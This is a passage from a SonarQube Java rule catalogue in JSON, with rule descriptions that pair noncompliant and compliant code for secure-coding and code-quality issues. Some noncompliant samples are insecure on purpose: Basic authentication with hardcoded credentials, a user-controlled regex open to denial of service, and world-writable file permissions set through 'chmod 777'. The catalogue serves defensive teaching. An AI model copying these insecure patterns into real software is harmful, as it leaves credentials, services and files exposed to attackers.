href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/470\">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe\n  Reflection')</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2658","summary":"Classes should not be loaded dynamically","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Basic authentication is a vulnerable method of user authentication that should be avoided. It functions by transmitting a Base64 encoded username\nand password. As Base64 is easy to recognize and reverse, sensitive data may be leaked this way.</p>\n<h2>Why is this an issue?</h2>\n<p>Basic authentication is a simple and widely used method of user authentication for HTTP requests. When a client sends a request to a server that\nrequires authentication, the client includes the username and password (concatenated together and Base64 encoded) in the \"Authorization\" header of the\nHTTP request. The server verifies the credentials and grants access if they are valid. Every request sent to the server to a protected endpoint must\ninclude these credentials.</p>\n<p>Basic authentication is considered insecure for several reasons:</p>\n<ul>\n  <li> It transmits user credentials in plain text, making them susceptible to interception and eavesdropping. </li>\n  <li> It relies solely on the serverâs ability to verify the provided credentials. There is no mechanism for additional security measures like\n  multi-factor authentication or account lockouts after multiple failed login attempts. </li>\n  <li> It does not provide a way to manage user sessions securely. The client typically includes the credentials in every request, which creates more\n  opportunities for an attacker to steal these credentials. </li>\n</ul>\n<p>These security limitations make basic authentication an insecure choice for authentication or authorization over HTTP.</p>\n<h3>What is the potential impact?</h3>\n<p>Basic authentication transmits passwords in plain text, which makes it vulnerable to interception by attackers.</p>\n<h4>Session hijacking and man-in-the-middle attack</h4>\n<p>If an attacker gains access to the network traffic, they can easily capture the username and password. Basic authentication does not provide any\nmechanism to protect against session hijacking attacks. Once a user is authenticated, the session identifier (the username and password) is sent in\nclear text with each subsequent request. If attackers can intercept one request, they can use it to impersonate the authenticated user, gaining\nunauthorized access to their account and potentially performing malicious actions.</p>\n<h4>Brute-force attacks</h4>\n<p>Basic authentication does not have any built-in protection against brute-force attacks. Attackers can repeatedly guess passwords until they find\nthe correct one, especially if weak or commonly used passwords are used. This can lead to unauthorized access to user accounts and potential data\nbreaches.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code uses basic authentication to send out an HTTP request to a protected endpoint.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nString encoded = Base64.getEncoder().encodeToString(\"login:passwd\".getBytes());\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setDoOutput(true);\nconn.setRequestProperty(\"Authorization\", \"Basic \" + encoded); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\n// An access token should be retrieved before the HTTP request\nString accessToken = System.getenv(\"ACCESS_TOKEN\");\nHttpURLConnection conn = (HttpURLConnection) url.openConnection();\nconn.setRequestMethod(\"POST\");\nconn.setDoOutput(true);\nconn.setRequestProperty(\"Authorization\", \"Bearer \" + accessToken);\n</pre>\n<h3>How does this work?</h3>\n<h4>Token-based authentication and OAuth</h4>\n<p>Token-based authentication is a safer alternative than basic authentication. A unique token is generated upon successful authentication and sent to\nthe client, which is then included in subsequent requests. Therefore, it eliminates the need to transmit sensitive credentials with each request.\nOAuth also works by authenticating users via tokens. It gives even more flexibility on top of this by offering scopes, which limit an applicationâs\naccess to a userâs account.</p>\n<p>Additionally, both token-based authentication and OAuth support mechanisms for token expiration, revocation, and refresh. This gives more\nflexibility than basic authentication, as compromised tokens carry much less risk than a compromised password.</p>\n<h4>SSL encryption for HTTP requests</h4>\n<p>With basic authentication, user credentials are transmitted in plain text, which makes them vulnerable to interception and eavesdropping. However,\nwhen HTTPS is employed, the data is encrypted before transmission, making it significantly more difficult for attackers to intercept and decipher the\ncredentials. If no other form of authentication is possible for this code, then every request must be sent over HTTPS to ensure credentials are kept\nsafe.</p>\n<h2>How to fix it in Apache HttpClient</h2>\n<h3>Code examples</h3>\n<p>The following code uses basic authentication to send out an HTTP request to a protected endpoint.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.apache.http.client.methods.HttpPost;\n\nString encoded = Base64.getEncoder().encodeToString(\"login:passwd\".getBytes());\nHttpPost httpPost = new HttpPost(\"http://api.example.com/foo\");\nhttpPost.setHeader(\"Authorization\", \"Basic \" + encoded); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.apache.http.client.methods.HttpPost;\n\n// An access token should be retrieved before the HTTP request\nString accessToken = System.getenv(\"ACCESS_TOKEN\");\nHttpPost httpPost = new HttpPost(\"http://api.example.com/foo\");\nhttpPost.setHeader(\"Authorization\", \"Bearer \" + accessToken);\n</pre>\n<h3>How does this work?</h3>\n<h4>Token-based authentication and OAuth</h4>\n<p>Token-based authentication is a safer alternative than basic authentication. A unique token is generated upon successful authentication and sent to\nthe client, which is then included in subsequent requests. Therefore, it eliminates the need to transmit sensitive credentials with each request.\nOAuth also works by authenticating users via tokens. It gives even more flexibility on top of this by offering scopes, which limit an applicationâs\naccess to a userâs account.</p>\n<p>Additionally, both token-based authentication and OAuth support mechanisms for token expiration, revocation, and refresh. This gives more\nflexibility than basic authentication, as compromised tokens carry much less risk than a compromised password.</p>\n<h4>SSL encryption for HTTP requests</h4>\n<p>With basic authentication, user credentials are transmitted in plain text, which makes them vulnerable to interception and eavesdropping. However,\nwhen HTTPS is employed, the data is encrypted before transmission, making it significantly more difficult for attackers to intercept and decipher the\ncredentials. If no other form of authentication is possible for this code, then every request must be sent over HTTPS to ensure credentials are kept\nsafe.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> MDN web docs - <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication\">HTTP authentication</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication\">OWASP Web Service Security\n  Cheat Sheet</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/522\">CWE-522 - Insufficiently Protected Credentials</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222533\">Application Security and\n  Development: V-222533</a> - The application must authenticate all network connected endpoint devices before establishing any connection. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2647","summary":"Basic authentication should not be used","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>\n<p>The following should not be used as regular expressions:</p>\n<ul>\n  <li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em> </li>\n  <li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters </li>\n  <li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nString str = \"/File|Name.txt\";\n\nString clean = str.replaceAll(\".\",\"\"); // Noncompliant; probably meant to remove only dot chars, but returns an empty string\nString clean2 = str.replaceAll(\"|\",\"_\"); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_\nString clean3 = str.replaceAll(File.separator,\"\"); // Noncompliant; exception on Windows\n\nString clean4 = str.replaceFirst(\".\",\"\"); // Noncompliant;\nString clean5 = str.replaceFirst(\"|\",\"_\"); // Noncompliant;\nString clean6 = str.replaceFirst(File.separator,\"\"); // Noncompliant;\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2639","summary":"Inappropriate regular expressions should not be used","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule raises an issue when an overriding method changes a contract defined in a superclass.</p>\n<h2>Why is this an issue?</h2>\n<p>Because a subclass instance may be cast to and treated as an instance of the superclass, overriding methods should uphold the aspects of the\nsuperclass contract that relate to the Liskov Substitution Principle. Specifically, if the parameters or return type of the superclass method are\nmarked with any of the following: <code>@Nullable</code>, <code>@CheckForNull</code>, <code>@NotNull</code>, <code>@NonNull</code>, and\n<code>@Nonnull</code>, then subclass parameters are not allowed to tighten the contract, and return values are not allowed to loosen it.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Fruit {\n\n  private Season ripe;\n  private String color;\n\n  public void setRipe(@Nullable Season ripe) {\n    this.ripe = ripe;\n  }\n\n  public @NotNull Integer getProtein() {\n    return 12;\n  }\n}\n\npublic class Raspberry extends Fruit {\n\n  public void setRipe(@NotNull Season ripe) {  // Noncompliant: the ripe argument annotated as @Nullable in parent class\n    this.ripe = ripe;\n  }\n\n  public @Nullable Integer getProtein() {  // Noncompliant: the return type annotated as @NotNull in parent class\n    return null;\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Fruit {\n\n  private Season ripe;\n  private String color;\n\n  public void setRipe(@Nullable Season ripe) {\n    this.ripe = ripe;\n  }\n\n  public @NotNull Integer getProtein() {\n    return 12;\n  }\n}\n\npublic class Raspberry extends Fruit {\n\n  public void setRipe(@Nullable Season ripe) {\n    this.ripe = ripe;\n  }\n\n  public @NotNull Integer getProtein() {\n    return 12;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> SOLID - <a href=\"https://en.wikipedia.org/wiki/Liskov_substitution_principle\">Wikipedia - Liskov substitution principle</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2638","summary":"Method overrides should not change contracts","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Fields, parameters and return values marked <code>@NotNull</code>, <code>@NonNull</code>, or <code>@Nonnull</code> are assumed to have non-null\nvalues and are not typically null-checked before use. Therefore setting one of these values to <code>null</code>, or failing to set such a class field\nin a constructor, could cause <code>NullPointerException</code>s at runtime.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MainClass {\n\n  @Nonnull\n  private String primary;\n  private String secondary;\n\n  public MainClass(String color) {\n    if (color != null) {\n      secondary = null;\n    }\n    primary = color;  // Noncompliant; \"primary\" is Nonnull but could be set to null here\n  }\n\n  public MainClass() { // Noncompliant; \"primary\" is Nonnull but is not initialized\n  }\n\n  @Nonnull\n  public String indirectMix() {\n    String mix = null;\n    return mix;  // Noncompliant; return value is Nonnull, but null is returned.\n  }\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/QdcxBQ\">EXP34-C. Do not dereference null pointers</a> </li>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/EXP01-J.+Do+not+use+a+null+in+a+case+where+an+object+is+required\">EXP01-J. Do\n  not use a null in a case where an object is required</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/476\">CWE-476 NULL Pointer Dereference</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-2637","summary":"\"@NonNull\" values should not be set to null","tags":["cwe","cert","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>\n<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this\ncan lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to make the affected component inaccessible.</p>\n<p>Depending on the applicationâs software architecture and the injection pointâs location, the impact may or may not be visible.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Self Denial of Service</h4>\n<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)\ncan trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>\n<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>\n<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service might only affect the attacker who initiated it.</p>\n<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems\nwould detect the failure of a container and automatically replace it.</p>\n<h4>Infrastructure SPOFs</h4>\n<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture\nvulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient\ncontainer creation capabilities or failures from containers to terminate).</p>\n<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge\noffensive infrastructures.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in Java Regex API</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to Regex Denial of Service because untrusted data is used as a regex to scan a string without prior\nsanitization or validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic boolean validate(HttpServletRequest request) {\n  String regex = request.getParameter(\"regex\");\n  String input = request.getParameter(\"input\");\n\n  return input.matches(regex);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.util.regex.Pattern;\n\npublic boolean validate(HttpServletRequest request) {\n  String regex = request.getParameter(\"regex\");\n  String input = request.getParameter(\"input\");\n\n  return input.matches(Pattern.quote(regex));\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Sanitization and Validation</h4>\n<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular\nexpression engine interprets these characters literally.</p>\n<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>\nIf a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>\n<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>\n<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Googleâs <a href=\"https://github.com/google/re2\">re2</a>.</p>\n<p>In the example, <code>Pattern.quote</code> escapes metacharacters and escape sequences that could have broken the initially intended logic.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> OWASP - <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">Regular expression Denial of Service - ReDoS</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222594\">Application Security and\n  Development: V-222594</a> - The application must restrict the ability to launch Denial of Service (DoS) attacks against itself or other information\n  systems. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222667\">Application Security and\n  Development: V-222667</a> - Protections against DoS attacks must be implemented. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2631","summary":"Regular expressions should not be vulnerable to Denial of Service attacks","tags":["cwe","denial-of-service","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"EFFICIENT","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Some method calls can effectively be \"no-ops\", meaning that the invoked method does nothing, based on the applicationâs configuration (eg: debug\nlogs in production). However, even if the method effectively does nothing, its arguments may still need to evaluated before the method is called.</p>\n<p>Passing message arguments that require further evaluation into a Guava <code>com.google.common.base.Preconditions</code> check can result in a\nperformance penalty. That is because whether or not theyâre needed, each argument must be resolved before the method is actually called.</p>\n<p>Similarly, passing concatenated strings into a logging method can also incur a needless performance hit because the concatenation will be performed\nevery time the method is called, whether or not the log level is low enough to show the message.</p>\n<p>Instead, you should structure your code to pass static or pre-computed values into <code>Preconditions</code> conditions check and logging\ncalls.</p>\n<p>Specifically, the built-in string formatting should be used instead of string concatenation, and if the message is the result of a method call,\nthen <code>Preconditions</code> should be skipped altogether, and the relevant exception should be conditionally thrown instead.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nlogger.log(Level.DEBUG, \"Something went wrong: \" + message);  // Noncompliant; string concatenation performed even when log level too high to show DEBUG messages\n\nlogger.fine(\"An exception occurred with message: \" + message); // Noncompliant\n\nLOG.error(\"Unable to open file \" + csvPath, e);  // Noncompliant\n\nPreconditions.checkState(a &gt; 0, \"Arg must be positive, but got \" + a);  // Noncompliant. String concatenation performed even when a &gt; 0\n\nPreconditions.checkState(condition, formatMessage());  // Noncompliant. formatMessage() invoked regardless of condition\n\nPreconditions.checkState(condition, \"message: %s\", formatMessage());  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nlogger.log(Level.DEBUG, \"Something went wrong: {0} \", message);  // String formatting only applied if needed\nlogger.log(Level.SEVERE, () -&gt; \"Something went wrong: \" + message); // since Java 8, we can use Supplier , which will be evaluated lazily\n\nlogger.fine(\"An exception occurred with message: {}\", message);  // SLF4J, Log4j\n\nLOG.error(\"Unable to open file {0}\", csvPath, e);\n\nif (LOG.isDebugEnabled()) {\n  LOG.debug(\"Unable to open file \" + csvPath, e);  // this is compliant, because it will not evaluate if log level is above debug.\n}\n\nPreconditions.checkState(arg &gt; 0, \"Arg must be positive, but got %d\", a);  // String formatting only applied if needed\n\nif (!condition) {\n  throw new IllegalStateException(formatMessage());  // formatMessage() only invoked conditionally\n}\n\nif (!condition) {\n  throw new IllegalStateException(\"message: \" + formatMessage());\n}\n</pre>\n<h3>Exceptions</h3>\n<p><code>catch</code> blocks are ignored, because the performance penalty is unimportant on exceptional paths (catch block should not be a part of\nstandard program flow). Getters are ignored as well as methods called on annotations which can be considered as getters. This rule accounts for\nexplicit test-level testing with SLF4J methods <code>isXXXEnabled</code> and ignores the bodies of such <code>if</code> statements.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2629","summary":"\"Preconditions\" and logging arguments should not require evaluation","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n    public void setPermissions(String filePath) {\n        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();\n        // user permission\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n        // group permissions\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n        // others permissions\n        perms.add(PosixFilePermission.OTHERS_READ); // Sensitive\n        perms.add(PosixFilePermission.OTHERS_WRITE); // Sensitive\n        perms.add(PosixFilePermission.OTHERS_EXECUTE); // Sensitive\n\n        Files.setPosixFilePermissions(Paths.get(filePath), perms);\n    }\n</pre>\n<pre>\n    public void setPermissionsUsingRuntimeExec(String filePath) {\n        Runtime.getRuntime().exec(\"chmod 777 file.json\"); // Sensitive\n    }\n</pre>\n<pre>\n    public void setOthersPermissionsHardCoded(String filePath ) {\n        Files.setPosixFilePermissions(Paths.get(filePath), PosixFilePermissions.fromString(\"rwxrwxrwx\")); // Sensitive\n    }\n</pre>\n<h2>Compliant Solution</h2>\n<p>On operating systems that implement POSIX standard. This will throw a <code>UnsupportedOperationException</code> on Windows.</p>\n<pre>\n    public void setPermissionsSafe(String filePath) throws IOException {\n        Set&lt;PosixFilePermission&gt; perms = new HashSet&lt;PosixFilePermission&gt;();\n        // user permission\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n        // group permissions\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n        // others permissions removed\n        perms.remove(PosixFilePermission.OTHERS_READ); // Compliant\n        perms.remove(PosixFilePermission.OTHERS_WRITE); // Compliant\n        perms.remove(PosixFilePermission.OTHERS_EXECUTE); // Compliant\n\n        Files.setPosixFilePermissions(Paths.get(filePath), perms);\n    }\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/FIO01-J.+Create+files+with+appropriate+access+permissions\">CERT, FIO01-J.</a> -\n  Create files with appropriate access permissions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions\">CERT, FIO06-C.</a> - Create\n  files with appropriate access permissions </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222430\">Application Security and\n  Development: V-222430</a> - The application must execute without excessive account permissions. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2612","summary":"Setting loose POSIX file permissions is security-sensitive","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<p>Gratuitous boolean expressions are conditions that do not change the evaluation of a program. This issue can indicate logical errors and affect the\ncorrectness of an application, as well as its maintainability.</p>\n<h2>Why is this an issue?</h2>\n<p>Control flow constructs like <code>if</code>-statements allow the programmer to direct the flow of a program depending on a boolean expression.\nHowever, if the condition is always true or always false, only one of the branches will ever be executed. In that case, the control flow construct and\nthe condition no longer serve a purpose; they become <em>gratuitous</em>.</p>\n<h3>What is the potential impact?</h3>\n<p>The presence of gratuitous conditions can indicate a logical error. For example, the programmer <em>intended</em> to have the program branch into\ndifferent paths but made a mistake when formulating the branching condition. In this case, this issue might result in a bug and thus affect the\nreliability of the application. For instance, it might lead to the computation of incorrect results.</p>\n<p>Additionally, gratuitous conditions and control flow constructs introduce unnecessary complexity. The source code becomes harder to understand, and\nthus, the application becomes more difficult to maintain.</p>\n<h2>How to fix it</h2>\n<p>Gratuitous boolean expressions are suspicious and should be carefully removed from the code.</p>\n<p>First, the boolean expression in question should be closely inspected for logical errors. If a mistake was made, it can be corrected so the\ncondition is no longer gratuitous.</p>\n<p>If it becomes apparent that the condition is actually unnecessary, it can be removed. The associated control flow construct (e.g., the\n<code>if</code>-statement containing the condition) will be adapted or even removed, leaving only the necessary branches.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n    public void doThings(boolean b, boolean c) {\n        a = true;\n        if (a) {                // Noncompliant\n          doSomething();\n        }\n\n        if (b &amp;&amp; a) {           // Noncompliant; \"a\" is always \"true\"\n          doSomething();\n        }\n\n        if (c || !a) {          // Noncompliant; \"!a\" is always \"false\"\n          doSomething();\n        }\n\n        if (c || (!c &amp;&amp; b)) {   // Noncompliant; c || (!c &amp;&amp; b) is equal to c || b\n          doSomething();\n        }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass {\n    public void doThings(boolean b, boolean c) {\n        a = true;\n        if (foo(a)) {\n          doSomething();\n        }\n\n        if (b) {\n          doSomething();\n        }\n\n        if (c) {\n          doSomething();\n        }\n\n        if (c || b) {\n          doSomething();\n        }\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/571\">CWE-571 - Expression is Always True</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/570\">CWE-570 - Expression is Always False</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2589","summary":"Boolean expressions should not be gratuitous","tags":["cwe","suspicious","redundant","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to <a\nhref=\"https://en.wikipedia.org/wiki/Unreachable_code\">unreachable code</a>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\na = false;\nif (a) { // Noncompliant\n  doSomething(); // never executed\n}\n\nif (!a || b) { // Noncompliant; \"!a\" is always \"true\", \"b\" is never evaluated\n  doSomething();\n} else {\n  doSomethingElse(); // never executed\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule will not raise an issue in either of these cases:</p>\n<ul>\n  <li> When the condition is a single <code>final boolean</code> </li>\n</ul>\n<pre>\nfinal boolean debug = false;\n//...\nif (debug) {\n  // Print something\n}\n</pre>\n<ul>\n  <li> When the condition is literally 